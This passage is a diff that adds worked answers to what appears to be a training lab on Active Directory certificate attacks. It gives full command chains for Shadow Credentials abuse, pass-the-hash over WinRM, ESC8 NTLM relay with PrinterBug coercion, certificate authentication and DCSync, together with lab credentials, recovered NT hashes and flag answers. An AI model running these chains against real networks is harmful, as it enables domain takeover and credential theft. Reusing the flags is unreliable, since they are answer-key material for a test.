@@ -235,7 +235,94 @@ In some environments, the KDC **doesn't support PKINIT** for certain victims (e.
 
 ## Exercise
 
-*Add exercise answers here as you complete them*
+### Lab Targets
+
+- `10.129.234.174` (`DC01`)
+- `10.129.234.172` (`CA01`)
+- Initial creds: `inlanefreight.local\wwhite : package5shores_topher1`
+
+### Question 1
+
+**Prompt:** What are the contents of `flag.txt` on `jpinkman`'s desktop?
+
+#### Chain Used (Shadow Credentials -> PtC -> WinRM)
+
+```bash
+# 1) Confirm access and context
+nxc ldap 10.129.234.174 -u wwhite -p 'package5shores_topher1'
+nxc winrm 10.129.234.174 -u wwhite -p 'package5shores_topher1'
+
+# 2) Abuse msDS-KeyCredentialLink for jpinkman
+certipy-ad shadow auto \
+    -u 'wwhite@inlanefreight.local' \
+    -p 'package5shores_topher1' \
+    -dc-ip 10.129.234.174 \
+    -target 10.129.234.174 \
+    -account jpinkman
+
+# 3) Use recovered jpinkman NT hash to execute over WinRM
+nxc winrm 10.129.234.174 \
+    -u jpinkman \
+    -H 9d995e5865f9dbfc701210466f0c78fe \
+    -X "whoami; Get-Content C:\\Users\\jpinkman\\Desktop\\flag.txt"
+```
+
+#### Answer
+
+`3d7e3dfb56b200ef715cfc300f07f3f8`
+
+---
+
+### Question 2
+
+**Prompt:** What are the contents of `flag.txt` on `Administrator`'s desktop?
+
+#### Chain Used (ESC8 Relay -> DC Cert -> PtC -> DCSync -> Admin WinRM)
+
+```bash
+# 1) Start ADCS relay listener
+impacket-ntlmrelayx \
+    -t http://10.129.234.172/certsrv/certfnsh.asp \
+    --adcs \
+    -smb2support \
+    --template KerberosAuthentication
+
+# 2) In another terminal, coerce DC auth to attacker
+python3 /tmp/krbrelayx/printerbug.py \
+    inlanefreight.local/wwhite:'package5shores_topher1'@10.129.234.174 \
+    10.10.17.176
+
+# 3) Relay output writes machine cert (observed file: DC01.pfx)
+ls -la | grep -E 'DC01|\.pfx'
+
+# 4) Authenticate with certificate and obtain DC machine auth material
+certipy-ad auth \
+    -pfx DC01.pfx \
+    -dc-ip 10.129.234.174 \
+    -username 'dc01$' \
+    -domain 'inlanefreight.local'
+
+# 5) DCSync Administrator using recovered DC01$ NT hash
+impacket-secretsdump \
+    -hashes :0d2b9ca430b925f72c9b5017533eb86c \
+    -just-dc-user Administrator \
+    inlanefreight.local/dc01\$@10.129.234.174
+
+# 6) Use Administrator NT hash to read desktop flag
+nxc winrm 10.129.234.174 \
+    -u Administrator \
+    -H fd02e525dd676fd8ca04e200d265f20c \
+    -X "Get-Content C:\\Users\\Administrator\\Desktop\\flag.txt"
+```
+
+#### Answer
+
+`a1fc497a8433f5a1b4c18274019a2cdb`
+
+### Notes
+
+- `certipy-ad shadow auto` restored original key credentials after extracting auth material.
+- In this lab, using the recovered `dc01$` NT hash with `impacket-secretsdump` was more reliable than Kerberos ccache mode for DCSync.
 
 ---
 
